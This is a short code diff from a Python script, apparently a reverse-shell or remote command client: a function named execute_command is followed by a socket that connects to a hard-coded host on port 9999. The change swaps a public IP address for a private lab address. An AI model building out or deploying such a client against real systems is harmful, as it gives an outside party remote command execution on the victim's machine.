@@ -14,7 +14,7 @@ def execute_command(command):
 
 s = socket.socket()
 
-host = '35.240.90.97'
+host = '192.168.56.1'
 port = 9999
 
 s.connect((host, port))
